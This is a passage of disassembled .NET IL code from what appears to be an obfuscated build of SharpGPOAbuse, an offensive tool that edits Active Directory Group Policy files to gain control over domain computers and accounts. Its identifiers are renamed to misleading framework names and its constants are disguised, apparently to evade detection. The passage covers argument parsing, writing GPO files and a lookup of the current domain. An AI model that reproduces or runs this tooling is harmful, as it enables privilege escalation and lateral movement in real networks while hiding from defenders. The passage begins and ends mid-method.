    IL_016e:  stloc.s    V_8
    IL_0170:  ldloc.s    V_8
    IL_0172:  ldsfld     string SignatureStruct
    IL_0177:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_017c:  stloc.s    V_9
    IL_017e:  ldloc.s    V_8
    IL_0180:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0185:  brfalse    IL_019d

    IL_018a:  ldloc.s    V_8
    IL_018c:  ldsfld     string Resolver
    IL_0191:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0196:  stloc.s    V_8
    IL_0198:  br         IL_01b4

    IL_019d:  ldsfld     string SByte
    IL_01a2:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_01a7:  ldc.i4.0
    IL_01a8:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01ad:  ldlen
    IL_01ae:  add
    IL_01af:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_01b4:  ldloc.s    V_8
    IL_01b6:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_01bb:  brtrue     IL_01c8

    IL_01c0:  ldloc.s    V_8
    IL_01c2:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
    IL_01c7:  pop
    IL_01c8:  ldloc.s    V_8
    IL_01ca:  ldsfld     string SerializableAttribute
    IL_01cf:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01d4:  stloc.s    V_8
    IL_01d6:  ldloc.s    V_8
    IL_01d8:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_01dd:  brfalse    IL_02fa

    IL_01e2:  ldc.i4.0
    IL_01e3:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01e8:  ldlen
    IL_01e9:  add
    IL_01ea:  stloc.s    V_10
    IL_01ec:  ldsfld     string SharedStatics
    IL_01f1:  ldloc.s    V_8
    IL_01f3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01f8:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_01fd:  ldloc.s    V_8
    IL_01ff:  call       string[] [mscorlib]System.IO.File::ReadAllLines(string)
    IL_0204:  stloc.s    V_11
    IL_0206:  ldloc.s    V_11
    IL_0208:  stloc.s    V_5
    IL_020a:  ldc.i4.0
    IL_020b:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0210:  ldlen
    IL_0211:  sub
    IL_0212:  stloc.s    V_6
    IL_0214:  br         IL_023f

    IL_0219:  ldloc.s    V_5
    IL_021b:  ldloc.s    V_6
    IL_021d:  ldelem     [mscorlib]System.String
    IL_0222:  ldsfld     string Single
    IL_0227:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_022c:  brfalse    IL_0239

    IL_0231:  ldc.i4.1
    IL_0232:  call       int32 '<Module>'(int32)
    IL_0237:  stloc.s    V_10
    IL_0239:  ldloc.s    V_6
    IL_023b:  ldc.i4.1
    IL_023c:  add
    IL_023d:  stloc.s    V_6
    IL_023f:  ldloc.s    V_6
    IL_0241:  ldloc.s    V_5
    IL_0243:  ldlen
    IL_0244:  conv.i4
    IL_0245:  blt.s      IL_0219

    IL_0247:  ldloc.s    V_10
    IL_0249:  brfalse    IL_0265

    IL_024e:  ldsfld     string TimeoutException
    IL_0253:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0258:  ldc.i4.0
    IL_0259:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_025e:  ldlen
    IL_025f:  sub
    IL_0260:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_0265:  ldloc.s    V_10
    IL_0267:  brtrue     IL_0327

    IL_026c:  ldsfld     string TimeSpan
    IL_0271:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0276:  ldloc.s    V_8
    IL_0278:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_027d:  stloc.s    V_12
    .try
    {
      IL_027f:  ldloc.s    V_11
      IL_0281:  stloc.s    V_5
      IL_0283:  ldc.i4.0
      IL_0284:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0289:  ldlen
      IL_028a:  add
      IL_028b:  stloc.s    V_6
      IL_028d:  br         IL_02b1

      IL_0292:  ldloc.s    V_5
      IL_0294:  ldloc.s    V_6
      IL_0296:  ldelem     [mscorlib]System.String
      IL_029b:  stloc.s    V_13
      IL_029d:  ldloc.s    V_12
      IL_029f:  ldloc.s    V_13
      IL_02a1:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_02a6:  ldloc.s    V_6
      IL_02a8:  ldc.i4.1
      IL_02a9:  call       int32 '<Module>'(int32)
      IL_02ae:  add
      IL_02af:  stloc.s    V_6
      IL_02b1:  ldloc.s    V_6
      IL_02b3:  ldloc.s    V_5
      IL_02b5:  ldlen
      IL_02b6:  conv.i4
      IL_02b7:  blt.s      IL_0292

      IL_02b9:  ldloc.s    V_12
      IL_02bb:  ldsfld     string TypeCode
      IL_02c0:  call       string [mscorlib]System.Environment::get_NewLine()
      IL_02c5:  ldloc.s    V_4
      IL_02c7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02cc:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_02d1:  leave      IL_02e5

    }  // end .try
    finally
    {
      IL_02d6:  ldloc.s    V_12
      IL_02d8:  brfalse    IL_02e4

      IL_02dd:  ldloc.s    V_12
      IL_02df:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_02e4:  endfinally
    }  // end handler
    IL_02e5:  ldarg.0
    IL_02e6:  ldarg.3
    IL_02e7:  ldarg.2
    IL_02e8:  ldloc.s    V_9
    IL_02ea:  ldsfld     string TypedReference
    IL_02ef:  ldsfld     string TypeInitializationException
    IL_02f4:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_02f9:  ret

    IL_02fa:  ldsfld     string UInt16
    IL_02ff:  ldloc.s    V_8
    IL_0301:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0306:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_030b:  ldloc.s    V_8
    IL_030d:  ldloc.3
    IL_030e:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_0313:  ldarg.0
    IL_0314:  ldarg.3
    IL_0315:  ldarg.2
    IL_0316:  ldloc.s    V_9
    IL_0318:  ldsfld     string UInt32
    IL_031d:  ldsfld     string UInt64
    IL_0322:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0327:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::CaseInsensitiveHashCodeProvider

  .method public hidebysig static void  IDictionaryEnumerator(string[] Hashtable) cil managed
  {
    .entrypoint
    // Code size       1708 (0x6ac)
    .maxstack  58
    .locals init ([0] string[] V_0,
             [1] bool V_1,
             [2] string V_2,
             [3] string V_3,
             [4] string V_4,
             [5] string V_5,
             [6] string V_6,
             [7] string V_7,
             [8] string V_8,
             [9] string V_9,
             [10] bool V_10,
             [11] bool V_11,
             [12] bool V_12,
             [13] string V_13,
             [14] string V_14,
             [15] bool V_15,
             [16] bool V_16,
             [17] bool V_17,
             [18] string[] V_18,
             [19] class SharpGPOAbuse.TimerCallback V_19,
             [20] string[] V_20,
             [21] int32 V_21,
             [22] string V_22,
             [23] class [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.Domain V_23,
             [24] string V_24,
             [25] string V_25)
    IL_0000:  ldarg.0
    IL_0001:  brtrue     IL_000c

    IL_0006:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_REFERENCE_IDENTITY_TO_TEXT_FLAGS()
    IL_000b:  ret

    IL_000c:  ldc.i4.s   44
    IL_000e:  newarr     [mscorlib]System.String
    IL_0013:  dup
    IL_0014:  ldc.i4.0
    IL_0015:  ldsfld     string UIntPtr
    IL_001a:  stelem.ref
    IL_001b:  dup
    IL_001c:  ldc.i4.1
    IL_001d:  ldsfld     string UnauthorizedAccessException
    IL_0022:  stelem.ref
    IL_0023:  dup
    IL_0024:  ldc.i4.2
    IL_0025:  ldsfld     string UnitySerializationHolder
    IL_002a:  stelem.ref
    IL_002b:  dup
    IL_002c:  ldc.i4.3
    IL_002d:  ldsfld     string UnhandledExceptionEventArgs
    IL_0032:  stelem.ref
    IL_0033:  dup
    IL_0034:  ldc.i4.4
    IL_0035:  ldsfld     string UnhandledExceptionEventHandler
    IL_003a:  stelem.ref
    IL_003b:  dup
    IL_003c:  ldc.i4.5
    IL_003d:  ldsfld     string UnSafeCharBuffer
    IL_0042:  stelem.ref
    IL_0043:  dup
    IL_0044:  ldc.i4.6
    IL_0045:  ldsfld     string Variant
    IL_004a:  stelem.ref
    IL_004b:  dup
    IL_004c:  ldc.i4.7
    IL_004d:  ldsfld     string Version
    IL_0052:  stelem.ref
    IL_0053:  dup
    IL_0054:  ldc.i4.8
    IL_0055:  ldsfld     string Void
    IL_005a:  stelem.ref
    IL_005b:  dup
    IL_005c:  ldc.i4.s   9
    IL_005e:  ldsfld     string WeakReference
    IL_0063:  stelem.ref
    IL_0064:  dup
    IL_0065:  ldc.i4.s   10
    IL_0067:  ldsfld     string XmlIgnoreMemberAttribute
    IL_006c:  stelem.ref
    IL_006d:  dup
    IL_006e:  ldc.i4.s   11
    IL_0070:  ldsfld     string AbandonedMutexException
    IL_0075:  stelem.ref
    IL_0076:  dup
    IL_0077:  ldc.i4.s   12
    IL_0079:  ldsfld     string WaitHandle
    IL_007e:  stelem.ref
    IL_007f:  dup
    IL_0080:  ldc.i4.s   13
    IL_0082:  ldsfld     string EventWaitHandle
    IL_0087:  stelem.ref
    IL_0088:  dup
    IL_0089:  ldc.i4.s   14
    IL_008b:  ldsfld     string AutoResetEvent
    IL_0090:  stelem.ref
    IL_0091:  dup
    IL_0092:  ldc.i4.s   15
    IL_0094:  ldsfld     string SynchronizationContextSwitcher
    IL_0099:  stelem.ref
    IL_009a:  dup
    IL_009b:  ldc.i4.s   16
    IL_009d:  ldsfld     string SendOrPostCallback
    IL_00a2:  stelem.ref
    IL_00a3:  dup
    IL_00a4:  ldc.i4.s   17
    IL_00a6:  ldsfld     string SynchronizationContextProperties
    IL_00ab:  stelem.ref
    IL_00ac:  dup
    IL_00ad:  ldc.i4.s   18
    IL_00af:  ldsfld     string SynchronizationContext
    IL_00b4:  stelem.ref
    IL_00b5:  dup
    IL_00b6:  ldc.i4.s   19
    IL_00b8:  ldsfld     string CompressedStackSwitcher
    IL_00bd:  stelem.ref
    IL_00be:  dup
    IL_00bf:  ldc.i4.s   20
    IL_00c1:  ldsfld     string SafeHandle
    IL_00c6:  stelem.ref
    IL_00c7:  dup
    IL_00c8:  ldc.i4.s   21
    IL_00ca:  ldsfld     string SafeCompressedStackHandle
    IL_00cf:  stelem.ref
    IL_00d0:  dup
    IL_00d1:  ldc.i4.s   22
    IL_00d3:  ldsfld     string CompressedStack
    IL_00d8:  stelem.ref
    IL_00d9:  dup
    IL_00da:  ldc.i4.s   23
    IL_00dc:  ldsfld     string DomainCompressedStack
    IL_00e1:  stelem.ref
    IL_00e2:  dup
    IL_00e3:  ldc.i4.s   24
    IL_00e5:  ldsfld     string EventResetMode
    IL_00ea:  stelem.ref
    IL_00eb:  dup
    IL_00ec:  ldc.i4.s   25
    IL_00ee:  ldsfld     string ExceptionType
    IL_00f3:  stelem.ref
    IL_00f4:  dup
    IL_00f5:  ldc.i4.s   26
    IL_00f7:  ldsfld     string WaitDelegate
    IL_00fc:  stelem.ref
    IL_00fd:  dup
    IL_00fe:  ldc.i4.s   27
    IL_0100:  ldsfld     string ExecutionContextSwitcher
    IL_0105:  stelem.ref
    IL_0106:  dup
    IL_0107:  ldc.i4.s   28
    IL_0109:  ldsfld     string AsyncFlowControl
    IL_010e:  stelem.ref
    IL_010f:  dup
    IL_0110:  ldc.i4.s   29
    IL_0112:  ldsfld     string ContextCallback
    IL_0117:  stelem.ref
    IL_0118:  dup
    IL_0119:  ldc.i4.s   30
    IL_011b:  ldsfld     string ExecutionContext
    IL_0120:  stelem.ref
    IL_0121:  dup
    IL_0122:  ldc.i4.s   31
    IL_0124:  ldsfld     string Interlocked
    IL_0129:  stelem.ref
    IL_012a:  dup
    IL_012b:  ldc.i4.s   32
    IL_012d:  ldsfld     string IObjectHandle
    IL_0132:  stelem.ref
    IL_0133:  dup
    IL_0134:  ldc.i4.s   33
    IL_0136:  ldsfld     string HostExecutionContextSwitcher
    IL_013b:  stelem.ref
    IL_013c:  dup
    IL_013d:  ldc.i4.s   34
    IL_013f:  ldsfld     string HostExecutionContext
    IL_0144:  stelem.ref
    IL_0145:  dup
    IL_0146:  ldc.i4.s   35
    IL_0148:  ldsfld     string IUnknownSafeHandle
    IL_014d:  stelem.ref
    IL_014e:  dup
    IL_014f:  ldc.i4.s   36
    IL_0151:  ldsfld     string HostExecutionContextManager
    IL_0156:  stelem.ref
    IL_0157:  dup
    IL_0158:  ldc.i4.s   37
    IL_015a:  ldsfld     string LockCookie
    IL_015f:  stelem.ref
    IL_0160:  dup
    IL_0161:  ldc.i4.s   38
    IL_0163:  ldsfld     string ManualResetEvent
    IL_0168:  stelem.ref
    IL_0169:  dup
    IL_016a:  ldc.i4.s   39
    IL_016c:  ldsfld     string Monitor
    IL_0171:  stelem.ref
    IL_0172:  dup
    IL_0173:  ldc.i4.s   40
    IL_0175:  ldsfld     string Mutex
    IL_017a:  stelem.ref
    IL_017b:  dup
    IL_017c:  ldc.i4.s   41
    IL_017e:  ldsfld     string NativeOverlapped
    IL_0183:  stelem.ref
    IL_0184:  dup
    IL_0185:  ldc.i4.s   42
    IL_0187:  ldsfld     string _IOCompletionCallback
    IL_018c:  stelem.ref
    IL_018d:  dup
    IL_018e:  ldc.i4.s   43
    IL_0190:  ldsfld     string OverlappedData
    IL_0195:  stelem.ref
    IL_0196:  stloc.0
    IL_0197:  ldc.i4.0
    IL_0198:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_019d:  ldlen
    IL_019e:  sub
    IL_019f:  stloc.1
    IL_01a0:  ldsfld     string Overlapped
    IL_01a5:  stloc.2
    IL_01a6:  ldsfld     string OverlappedDataCacheLine
    IL_01ab:  stloc.3
    IL_01ac:  ldsfld     string OverlappedDataCache
    IL_01b1:  stloc.s    V_4
    IL_01b3:  ldsfld     string ParameterizedThreadStart
    IL_01b8:  stloc.s    V_5
    IL_01ba:  ldsfld     string ReaderWriterLock
    IL_01bf:  stloc.s    V_6
    IL_01c1:  ldsfld     string SynchronizationLockException
    IL_01c6:  stloc.s    V_7
    IL_01c8:  ldsfld     string InternalCrossContextDelegate
    IL_01cd:  stloc.s    V_8
    IL_01cf:  ldsfld     string ThreadHelper
    IL_01d4:  stloc.s    V_9
    IL_01d6:  ldc.i4.0
    IL_01d7:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01dc:  ldlen
    IL_01dd:  add
    IL_01de:  stloc.s    V_10
    IL_01e0:  ldc.i4.0
    IL_01e1:  stloc.s    V_11
    IL_01e3:  ldc.i4.0
    IL_01e4:  stloc.s    V_12
    IL_01e6:  ldsfld     string Thread
    IL_01eb:  stloc.s    V_13
    IL_01ed:  ldsfld     string StackCrawlMark
    IL_01f2:  stloc.s    V_14
    IL_01f4:  ldc.i4.0
    IL_01f5:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01fa:  ldlen
    IL_01fb:  add
    IL_01fc:  stloc.s    V_15
    IL_01fe:  ldc.i4.0
    IL_01ff:  stloc.s    V_16
    IL_0201:  ldc.i4.0
    IL_0202:  stloc.s    V_17
    IL_0204:  ldnull
    IL_0205:  stloc.s    V_18
    IL_0207:  newobj     instance void SharpGPOAbuse.TimerCallback::.ctor()
    IL_020c:  stloc.s    V_19
    IL_020e:  call       class CommandLine.ICommandLineParser CommandLine.CommandLineParser::get_Default()
    IL_0213:  ldarg.0
    IL_0214:  ldloc.s    V_19
    IL_0216:  callvirt   instance bool CommandLine.ICommandLineParser::ParseArguments(string[],
                                                                                      object)
    IL_021b:  brfalse    IL_04fc

    IL_0220:  ldarg.0
    IL_0221:  ldlen
    IL_0222:  brtrue     IL_022d

    IL_0227:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_REFERENCE_IDENTITY_TO_TEXT_FLAGS()
    IL_022c:  ret

    IL_022d:  ldloc.s    V_19
    IL_022f:  callvirt   instance bool SharpGPOAbuse.TimerCallback::DeploymentMetadataEntry()
    IL_0234:  brfalse    IL_023f

    IL_0239:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_REFERENCE_IDENTITY_TO_TEXT_FLAGS()
    IL_023e:  ret

    IL_023f:  ldloc.s    V_19
    IL_0241:  callvirt   instance bool SharpGPOAbuse.TimerCallback::HashElementEntryFieldId()
    IL_0246:  ldloc.s    V_19
    IL_0248:  callvirt   instance bool SharpGPOAbuse.TimerCallback::CategoryMembershipEntryFieldId()
    IL_024d:  xor
    IL_024e:  ldloc.s    V_19
    IL_0250:  callvirt   instance bool SharpGPOAbuse.TimerCallback::AssemblyReferenceEntryFieldId()
    IL_0255:  xor
    IL_0256:  ldloc.s    V_19
    IL_0258:  callvirt   instance bool SharpGPOAbuse.TimerCallback::ResourceTableMappingEntry()
    IL_025d:  xor
    IL_025e:  ldloc.s    V_19
    IL_0260:  callvirt   instance bool SharpGPOAbuse.TimerCallback::ICategoryMembershipDataEntry()
    IL_0265:  xor
    IL_0266:  ldloc.s    V_19
    IL_0268:  callvirt   instance bool SharpGPOAbuse.TimerCallback::FileAssociationEntry()
    IL_026d:  xor
    IL_026e:  brtrue     IL_027e

    IL_0273:  ldsfld     string ThreadAbortException
    IL_0278:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_027d:  ret

    IL_027e:  ldloc.s    V_19
    IL_0280:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_ASSEMBLY_REFERENCE_DEPENDENT_ASSEMBLY_FLAG()
    IL_0285:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_028a:  brfalse    IL_029a

    IL_028f:  ldsfld     string ThreadInterruptedException
    IL_0294:  call       void [mscorlib]System.Console::Write(string)
    IL_0299:  ret

    IL_029a:  ldloc.s    V_19
    IL_029c:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_ASSEMBLY_REFERENCE_DEPENDENT_ASSEMBLY_FLAG()
    IL_02a1:  stloc.s    V_5
    IL_02a3:  ldloc.s    V_19
    IL_02a5:  callvirt   instance bool SharpGPOAbuse.TimerCallback::HashElementEntryFieldId()
    IL_02aa:  brfalse    IL_02dc

    IL_02af:  ldc.i4.1
    IL_02b0:  call       int32 '<Module>'(int32)
    IL_02b5:  stloc.s    V_10
    IL_02b7:  ldloc.s    V_19
    IL_02b9:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEnumUnknown()
    IL_02be:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_02c3:  brfalse    IL_02d3

    IL_02c8:  ldsfld     string ThreadPoolGlobals
    IL_02cd:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_02d2:  ret

    IL_02d3:  ldloc.s    V_19
    IL_02d5:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEnumUnknown()
    IL_02da:  stloc.s    V_4
    IL_02dc:  ldloc.s    V_19
    IL_02de:  callvirt   instance bool SharpGPOAbuse.TimerCallback::AssemblyReferenceEntryFieldId()
    IL_02e3:  brtrue     IL_02f4

    IL_02e8:  ldloc.s    V_19
    IL_02ea:  callvirt   instance bool SharpGPOAbuse.TimerCallback::ResourceTableMappingEntry()
    IL_02ef:  brfalse    IL_035a

    IL_02f4:  ldloc.s    V_19
    IL_02f6:  callvirt   instance bool SharpGPOAbuse.TimerCallback::AssemblyReferenceEntryFieldId()
    IL_02fb:  brfalse    IL_030d

    IL_0300:  ldc.i4.1
    IL_0301:  call       int32 '<Module>'(int32)
    IL_0306:  stloc.s    V_15
    IL_0308:  br         IL_0310

    IL_030d:  ldc.i4.1
    IL_030e:  stloc.s    V_16
    IL_0310:  ldloc.s    V_19
    IL_0312:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEntryPointEntry()
    IL_0317:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_031c:  brfalse    IL_032c

    IL_0321:  ldsfld     string ThreadPoolRequestQueue
    IL_0326:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_032b:  ret

    IL_032c:  ldloc.s    V_19
    IL_032e:  callvirt   instance string SharpGPOAbuse.TimerCallback::AssemblyRequestEntryFieldId()
    IL_0333:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0338:  brfalse    IL_0348

    IL_033d:  ldsfld     string RegisteredWaitHandleSafe
    IL_0342:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0347:  ret

    IL_0348:  ldloc.s    V_19
    IL_034a:  callvirt   instance string SharpGPOAbuse.TimerCallback::AssemblyRequestEntryFieldId()
    IL_034f:  stloc.s    V_13
    IL_0351:  ldloc.s    V_19
    IL_0353:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEntryPointEntry()
    IL_0358:  stloc.s    V_14
    IL_035a:  ldloc.s    V_19
    IL_035c:  callvirt   instance bool SharpGPOAbuse.TimerCallback::FileAssociationEntry()
    IL_0361:  brtrue     IL_0372

    IL_0366:  ldloc.s    V_19
    IL_0368:  callvirt   instance bool SharpGPOAbuse.TimerCallback::ICategoryMembershipDataEntry()
    IL_036d:  brfalse    IL_0401

    IL_0372:  ldloc.s    V_19
    IL_0374:  callvirt   instance bool SharpGPOAbuse.TimerCallback::FileAssociationEntry()
    IL_0379:  brfalse    IL_038b

    IL_037e:  ldc.i4.1
    IL_037f:  call       int32 '<Module>'(int32)
    IL_0384:  stloc.s    V_11
    IL_0386:  br         IL_038e

    IL_038b:  ldc.i4.1
    IL_038c:  stloc.s    V_12
    IL_038e:  ldloc.s    V_19
    IL_0390:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_SCHEMA_VERSION()
    IL_0395:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_039a:  brtrue     IL_03d2

    IL_039f:  ldloc.s    V_19
    IL_03a1:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_HASH_DIGESTMETHOD()
    IL_03a6:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_03ab:  brtrue     IL_03d2

    IL_03b0:  ldloc.s    V_19
    IL_03b2:  callvirt   instance string SharpGPOAbuse.TimerCallback::IMuiResourceTypeIdIntEntry()
    IL_03b7:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_03bc:  brtrue     IL_03d2

    IL_03c1:  ldloc.s    V_19
    IL_03c3:  callvirt   instance string SharpGPOAbuse.TimerCallback::MuiResourceTypeIdStringEntry()
    IL_03c8:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_03cd:  brfalse    IL_03dd

    IL_03d2:  ldsfld     string RegisteredWaitHandle
    IL_03d7:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_03dc:  ret

    IL_03dd:  ldloc.s    V_19
    IL_03df:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_SCHEMA_VERSION()
    IL_03e4:  stloc.s    V_6
    IL_03e6:  ldloc.s    V_19
    IL_03e8:  callvirt   instance string SharpGPOAbuse.TimerCallback::CMS_HASH_DIGESTMETHOD()
    IL_03ed:  stloc.s    V_7
    IL_03ef:  ldloc.s    V_19
    IL_03f1:  callvirt   instance string SharpGPOAbuse.TimerCallback::IMuiResourceTypeIdIntEntry()
    IL_03f6:  stloc.s    V_8
    IL_03f8:  ldloc.s    V_19
    IL_03fa:  callvirt   instance string SharpGPOAbuse.TimerCallback::MuiResourceTypeIdStringEntry()
    IL_03ff:  stloc.s    V_9
    IL_0401:  ldloc.s    V_19
    IL_0403:  callvirt   instance bool SharpGPOAbuse.TimerCallback::CategoryMembershipEntryFieldId()
    IL_0408:  brfalse    IL_040d

    IL_040d:  ldc.i4.1
    IL_040e:  call       int32 '<Module>'(int32)
    IL_0413:  stloc.s    V_17
    IL_0415:  ldloc.s    V_19
    IL_0417:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEnumUnknown()
    IL_041c:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0421:  brtrue     IL_0437

    IL_0426:  ldloc.s    V_19
    IL_0428:  callvirt   instance string SharpGPOAbuse.TimerCallback::ProgIdRedirectionEntry()
    IL_042d:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0432:  brfalse    IL_0442

    IL_0437:  ldsfld     string WaitCallback
    IL_043c:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0441:  ret

    IL_0442:  ldloc.s    V_19
    IL_0444:  callvirt   instance string SharpGPOAbuse.TimerCallback::IEnumUnknown()
    IL_0449:  stloc.s    V_4
    IL_044b:  ldloc.s    V_19
    IL_044d:  callvirt   instance string SharpGPOAbuse.TimerCallback::ProgIdRedirectionEntry()
    IL_0452:  ldc.i4.1
    IL_0453:  call       int32 '<Module>'(int32)
    IL_0458:  newarr     [mscorlib]System.Char
    IL_045d:  dup
    IL_045e:  ldc.i4.0
    IL_045f:  ldc.i4.s   44
    IL_0461:  stelem.i2
    IL_0462:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0467:  stloc.s    V_18
    IL_0469:  ldloc.s    V_18
    IL_046b:  stloc.s    V_20
    IL_046d:  ldc.i4.0
    IL_046e:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0473:  ldlen
    IL_0474:  sub
    IL_0475:  stloc.s    V_21
    IL_0477:  br         IL_04aa

    IL_047c:  ldloc.s    V_20
    IL_047e:  ldloc.s    V_21
    IL_0480:  ldelem     [mscorlib]System.String
    IL_0485:  stloc.s    V_22
    IL_0487:  ldloc.0
    IL_0488:  ldloc.s    V_22
    IL_048a:  call       bool [System.Core]System.Linq.Enumerable::Contains<string>(class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>,
                                                                                    !!0)
    IL_048f:  brtrue     IL_049f

    IL_0494:  ldsfld     string WaitOrTimerCallback
    IL_0499:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_049e:  ret

    IL_049f:  ldloc.s    V_21
    IL_04a1:  ldc.i4.1
    IL_04a2:  call       int32 '<Module>'(int32)
    IL_04a7:  add
    IL_04a8:  stloc.s    V_21
    IL_04aa:  ldloc.s    V_21
    IL_04ac:  ldloc.s    V_20
    IL_04ae:  ldlen
    IL_04af:  conv.i4
    IL_04b0:  blt.s      IL_047c

    IL_04b2:  ldloc.s    V_19
    IL_04b4:  callvirt   instance string SharpGPOAbuse.TimerCallback::TimerBase()
    IL_04b9:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_04be:  brtrue     IL_04cb

    IL_04c3:  ldloc.s    V_19
    IL_04c5:  callvirt   instance string SharpGPOAbuse.TimerCallback::TimerBase()
    IL_04ca:  stloc.3
    IL_04cb:  ldloc.s    V_19
    IL_04cd:  callvirt   instance string SharpGPOAbuse.TimerCallback::MTAThreadAttribute()
    IL_04d2:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_04d7:  brtrue     IL_04e4

    IL_04dc:  ldloc.s    V_19
    IL_04de:  callvirt   instance string SharpGPOAbuse.TimerCallback::MTAThreadAttribute()
    IL_04e3:  stloc.2
    IL_04e4:  ldloc.s    V_19
    IL_04e6:  callvirt   instance bool SharpGPOAbuse.TimerCallback::ICLRSurrogateEntry()
    IL_04eb:  brfalse    IL_0507

    IL_04f0:  ldc.i4.1
    IL_04f1:  call       int32 '<Module>'(int32)
    IL_04f6:  stloc.1
    IL_04f7:  br         IL_0507

    IL_04fc:  ldsfld     string _ThreadPoolWaitCallback
    IL_0501:  call       void [mscorlib]System.Console::Write(string)
    IL_0506:  ret

    IL_0507:  ldnull
    IL_0508:  stloc.s    V_23
    IL_050a:  ldloc.2
    IL_050b:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0510:  brfalse    IL_0531

    .try
    {
      IL_0515:  call       class [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.Domain [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.Domain::GetCurrentDomain()
      IL_051a:  stloc.s    V_23
      IL_051c:  leave      IL_0531

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_0521:  pop
      IL_0522:  ldsfld     string _ThreadPoolWaitOrTimerCallback
      IL_0527:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_052c:  leave      IL_06ab

    }  // end handler
    IL_0531:  ldloc.3
    IL_0532:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0537:  brfalse    IL_0549

